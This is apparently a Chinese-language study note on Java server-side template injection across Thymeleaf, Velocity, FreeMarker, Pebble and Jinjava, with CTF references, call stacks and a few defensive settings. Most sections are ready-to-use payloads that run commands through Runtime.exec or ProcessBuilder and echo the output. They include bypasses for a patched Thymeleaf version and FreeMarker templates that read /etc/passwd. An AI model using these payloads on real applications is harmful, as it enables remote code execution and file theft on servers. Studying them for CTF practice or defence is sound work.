# java 模板注入


>https://github.com/lufeirider/BypassShell/blob/master/JAVA/JAVA.md
>https://gosecure.github.io/template-injection-workshop/#0


+ [FreeMarker模板注入](FreeMarker)   后缀名.ftl
+ [Thymeleaf模板注入](Thymeleaf) **waero-ctf-2021-ideas-web 考察过**
+ [jsp模板注入](jsp)
+ [Velocity模板注入](Velocity)  **2021 四川省比赛省赛非攻Java logiclogic**  后缀名.vm  [wp](https://mp.weixin.qq.com/s?__biz=MzI3NDEzNzIxMg==&mid=2650481832&idx=2&sn=7b092fc6e26c7d5f131b8ef7a30dc85c&chksm=f3172dbbc460a4ad99f29b445dd92873304d7c34798f977695ba775a5096a6b707106190a09f&mpshare=1&scene=23&srcid=0924Bci6wWhHifB6Y7Cmc5hl&sharer_sharetime=1632452737857&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd)
+ [beetl模板注入](Beetl)
+ [jfinalcms enjoy](jfinalcms_enjoy) **2021 字节ctf考察过。**
+ [Java FreeMarker 模板引擎注入深入分析](https://mp.weixin.qq.com/s/aYTp0suulfjQ5dcocS33Kg)
-------------------------------------------------------------------------------------------------------------------------
# SSTI 

>花费了一些时间整理

# SSTI 

## Thymeleaf

> @panda 师傅已经分析的非常全面了，这里只是对自己学习做一个小总结。

Thymeleaf最后通过spel表达式进行代码执行的。

poc

```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc").getInputStream()).next()}__::.x
```

正常的调用栈(方便分析)

```
execute:138, Expression (org.thymeleaf.standard.expression)
preprocess:91, StandardExpressionPreprocessor (org.thymeleaf.standard.expression)
parseExpression:120, StandardExpressionParser (org.thymeleaf.standard.expression)
parseExpression:62, StandardExpressionParser (org.thymeleaf.standard.expression)
parseExpression:44, StandardExpressionParser (org.thymeleaf.standard.expression)
renderFragment:282, ThymeleafView (org.thymeleaf.spring5.view)
render:190, ThymeleafView (org.thymeleaf.spring5.view)
render:1400, DispatcherServlet (org.springframework.web.servlet)
processDispatchResult:1145, DispatcherServlet (org.springframework.web.servlet)
doDispatch:1084, DispatcherServlet (org.springframework.web.servlet)
doService:963, DispatcherServlet (org.springframework.web.servlet)
processRequest:1006, FrameworkServlet (org.springframework.web.servlet)
doGet:898, FrameworkServlet (org.springframework.web.servlet)
service:655, HttpServlet (javax.servlet.http)
service:883, FrameworkServlet (org.springframework.web.servlet)
service:764, HttpServlet (javax.servlet.http)
internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilter:53, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:93, FormContentFilter (org.springframework.web.filter)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
invoke:197, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:540, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:135, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:357, CoyoteAdapter (org.apache.catalina.connector)
service:382, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:895, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1722, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
```

在**Thymeleaf3.0.12**版本中进行了防御，但是可以bypass

```java
__${T%20(java.lang.Runtime).getRuntime().exec("calc")}__::.x
```

还需要说明一点。当 path 和返回的视图名⼀样的时候，需要使用**如下poc**

![image](https://user-images.githubusercontent.com/63966847/143764895-5ea0f3b0-c89f-4f87-9974-a254365106a8.png)


```java
;/__${T%20(java.lang.runtime).getruntime().exec("calc")}__::.x
/__${T%20(java.lang.runtime).getruntime().exec("calc")}__::.x
```

原因说下图，在进行**parseExpression**之前做了一个**checkViewNameNotInRequest**操作

![image](https://user-images.githubusercontent.com/63966847/143764903-587e5808-3533-4aee-975f-d61135ed315b.png)



所以在**Thymeleaf3.0.12**版本中直接return 视图名是不会触发的。

```java
@GetMapping("/path")
public String path(@RequestParam String lang) {
    return lang;
}
```

### 修复：

1. 设置ResponseBody注解

如果设置`ResponseBody`，则不再调用模板解析

2.设置redirect重定向

```java
@GetMapping("/safe/redirect")
public String redirect(@RequestParam String url) {
    return "redirect:" + url; //CWE-601, as we can control the hostname in redirect
    //forward:
```

根据spring boot定义，如果名称以**redirect:**开头，则不再调用**ThymeleafView**解析，调用**RedirectView**去解析controller的返回值

3.response

```java
@GetMapping("/safe/doc/{document}")
public void getDocument(@PathVariable String document, HttpServletResponse response) {
    log.info("Retrieving " + document); //FP
}
```

由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析

## Velocity

https://www.kancloud.cn/boshu/springboot/215859

https://cloud.tencent.com/developer/article/1771497

在springboot中超过1.5.x就不支持Velocity模板了，所以环境使用的是1.4.6.RELEASE



目前来说Velocity模板利用是有难度的，需要修改其模板内容也就是修改原文件，然后在进行解析。可以参考**四川省比赛省赛非攻Java logiclogic**



然后简单的调试一下Velocity模板的解析过程。

```
execute:175, ASTMethod (org.apache.velocity.runtime.parser.node)
execute:280, ASTReference (org.apache.velocity.runtime.parser.node)
render:369, ASTReference (org.apache.velocity.runtime.parser.node)
render:342, SimpleNode (org.apache.velocity.runtime.parser.node)
merge:356, Template (org.apache.velocity)
merge:260, Template (org.apache.velocity)
mergeTemplate:519, VelocityView (org.springframework.web.servlet.view.velocity)
doRender:464, VelocityView (org.springframework.web.servlet.view.velocity)
renderMergedTemplateModel:294, VelocityView (org.springframework.web.servlet.view.velocity)
renderMergedOutputModel:167, AbstractTemplateView (org.springframework.web.servlet.view)
render:303, AbstractView (org.springframework.web.servlet.view)
render:1282, DispatcherServlet (org.springframework.web.servlet)
processDispatchResult:1037, DispatcherServlet (org.springframework.web.servlet)
doDispatch:980, DispatcherServlet (org.springframework.web.servlet)
doService:897, DispatcherServlet (org.springframework.web.servlet)
processRequest:970, FrameworkServlet (org.springframework.web.servlet)
doGet:861, FrameworkServlet (org.springframework.web.servlet)
service:635, HttpServlet (javax.servlet.http)
service:846, FrameworkServlet (org.springframework.web.servlet)
service:742, HttpServlet (javax.servlet.http)
internalDoFilter:230, ApplicationFilterChain (org.apache.catalina.core)
doFilter:165, ApplicationFilterChain (org.apache.catalina.core)
doFilter:52, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:192, ApplicationFilterChain (org.apache.catalina.core)
doFilter:165, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:99, RequestContextFilter (org.springframework.web.filter)
doFilter:107, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:192, ApplicationFilterChain (org.apache.catalina.core)
doFilter:165, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:105, HttpPutFormContentFilter (org.springframework.web.filter)
doFilter:107, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:192, ApplicationFilterChain (org.apache.catalina.core)
doFilter:165, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:81, HiddenHttpMethodFilter (org.springframework.web.filter)
doFilter:107, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:192, ApplicationFilterChain (org.apache.catalina.core)
doFilter:165, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:197, CharacterEncodingFilter (org.springframework.web.filter)
doFilter:107, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:192, ApplicationFilterChain (org.apache.catalina.core)
doFilter:165, ApplicationFilterChain (org.apache.catalina.core)
invoke:198, StandardWrapperValve (org.apache.catalina.core)
invoke:96, StandardContextValve (org.apache.catalina.core)
invoke:478, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:140, StandardHostValve (org.apache.catalina.core)
invoke:80, ErrorReportValve (org.apache.catalina.valves)
invoke:87, StandardEngineValve (org.apache.catalina.core)
service:341, CoyoteAdapter (org.apache.catalina.connector)
service:799, Http11Processor (org.apache.coyote.http11)
process:66, AbstractProcessorLight (org.apache.coyote)
process:861, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1455, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
```



在调用template#merge的时候渲染触发org.apache.velocity.runtime.parser.node.SimpleNode#render对其他节点进行渲染

![image](https://user-images.githubusercontent.com/63966847/143764912-04aa195c-a3fa-49d1-8689-9ffdb568883a.png)

之后触发org.apache.velocity.runtime.parser.node.ASTReference#render

![image](https://user-images.githubusercontent.com/63966847/143764917-7c8e1420-b40b-49d5-bbc5-24c35ca2b1f2.png)

触发execute方法，之后通过反射去执行命令

![image](https://user-images.githubusercontent.com/63966847/143764918-1b6d2be5-64ae-400a-99b0-4dca7317ec2b.png)

exp

回显

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('whoami'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```



```java
#set($x='')$x.class.forName('java.lang.Runtime').getRuntime().exec('calc')
```

## Freemarker

https://www.cnblogs.com/Eleven-Liu/p/12747908.html

freemarker与velocity的攻击方式不太一样，freemarker可利用的点在于模版语法本身，直接渲染用户输入payload会被转码而失效，所以一般的利用场景为上传或者修改模版文件。

### poc

```html
<#assign value="freemarker.template.utility.Execute"?new()>
    ${value("calc.exe")}


    <#assign value="freemarker.template.utility.ObjectConstructor"?new()>
    ${value("java.lang.ProcessBuilder","calc.exe").start()}

    <#assign value="freemarker.template.utility.JythonRuntime"?new()>
    <@value>import os;os.system("calc.exe")</@value>

<#--    回显 -->
    <#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
    <#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.lang.ProcessBuilder","ifconfig").start().getInputStream())) >
    <#list 1..10000 as t>
        <#assign line=br.readLine()!"null">
        <#if line=="null">
            <#break>
        </#if>
        ${line}
        ${"<br>"}
    </#list>

<#--    读文件 -->
    <#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
    <#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.io.FileInputStream","/etc/passwd"))) >
    <#list 1..10000 as t>
        <#assign line=br.readLine()!"null">
        <#if line=="null">
            <#break>
        </#if>
        ${line?html}
        ${"<br>"}
    </#list>

    <#assign is=object?api.class.getResourceAsStream("/etc/passwd")>
    FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
    ${byte}, </#list>]

    <#assign uri=object?api.class.getResource("/").toURI()>
    <#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
    <#assign is=input?api.getInputStream()>
    FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
    ${byte}, </#list>]

    <#assign classLoader=object?api.class.protectionDomain.classLoader>
    <#assign clazz=classLoader.loadClass("ClassExposingGSON")>
    <#assign field=clazz?api.getField("GSON")>
    <#assign gson=field?api.get(null)>
    <#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))>
    ${ex("calc")}

    <#assign optTemp = .get_optional_template('/etc/passwd')>
    <#if optTemp.exists>
        Template was found:
        <@optTemp.include />
    <#else>
        Template was missing.
    </#if>

    <#include "/etc/passwd" parse=false>
```

将上面的payload写入到模版文件保存，然后让freemarker加载即可。

调用栈

```
exec:84, Execute (freemarker.template.utility)
_eval:62, MethodCall (freemarker.core)
eval:101, Expression (freemarker.core)
calculateInterpolatedStringOrMarkup:100, DollarVariable (freemarker.core)
accept:63, DollarVariable (freemarker.core)
visit:347, Environment (freemarker.core)
visit:353, Environment (freemarker.core)
process:326, Environment (freemarker.core)
process:383, Template (freemarker.template)
main:44, TestFreeMarker (com.firebasky.freemarker)
```



### 防御

![image-20211125205404061](img/image-20211125205404061.png)



```java
//不允许解析任何类。
configuration.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);

//相同UNRESTRICTED_RESOLVER，不同是它不允许解析ObjectConstructor和Execute和freemarker.template.utility.JythonRuntime。
configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);

//只需调用ClassUtil.forName(String).
configuration.setNewBuiltinClassResolver(TemplateClassResolver.UNRESTRICTED_RESOLVER);
```

### bypass

如果配置不当，依然会造成安全问题：

https://xz.aliyun.com/t/4846

https://www.freebuf.com/articles/web/287319.html

https://paper.seebug.org/1304/

## Pebble

https://www.kumamon.fun/server-side-template-injection-on-the-example-of-pebble/

https://juejin.cn/post/6844904048483647495

exp

```
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec("calc")%}
```

exp（Java 9+）

```
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

官方使用：

https://pebbletemplates.io/wiki/guide/basic-usage/

尝试找一种jdk8的回显 exp  .....

**目前只能这样**

```
{% set out = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec("whoami").inputStream %}
{{out.read()}}{{out.read()}}{{out.read()}}{{out.read()}}{{out.read()}}{{out.read()}}{{out.read()}}{{out.read()}}{{out.read()}}
```

更新

```java
{% set out = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec("whoami").inputStream %}
[{% for i in range(1,99) %}{% set byte = out.read() %}{{ byte }},{% endfor %}]
```

```python
a=[102,105,114,101,98,97,115,107,121,92,100,101,108,108,13,10,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1]
for i in a:
    print(chr(i),end="")
    if(i==-1):
        exit()
```

调用栈

```
exec:347, Runtime (java.lang)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeMember:100, DefaultAttributeResolver (com.mitchellbosecke.pebble.attributes)
resolve:67, DefaultAttributeResolver (com.mitchellbosecke.pebble.attributes)
evaluate:82, GetAttributeExpression (com.mitchellbosecke.pebble.node.expression)
render:31, SetNode (com.mitchellbosecke.pebble.node)
render:43, BodyNode (com.mitchellbosecke.pebble.node)
render:30, RootNode (com.mitchellbosecke.pebble.node)
evaluate:144, PebbleTemplateImpl (com.mitchellbosecke.pebble.template)
evaluate:87, PebbleTemplateImpl (com.mitchellbosecke.pebble.template)
main:22, test (com.firebasky.pebble)
```

## Jinjava

poc

```
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("")}}
```



```java
{{'a'.getClass().forName('java.lang.Runtime').methods[6].invoke(null).exec("calc")}}
```

try to find class object

测试失败。。。

```java
{% set class = ____int3rpr3t3r____.getContext().getAllFunctions().toArray()[0].getMethod().getParameterTypes()[0] %}
{% set is = class.getResourceAsStream("/Foo.class") %}
{% for I in range(999) %} {% set byte = is.read() %} {{ byte }}, {% endfor %}
```

>https://securitylab.github.com/advisories/GHSL-2020-072-hubspot_jinjava/
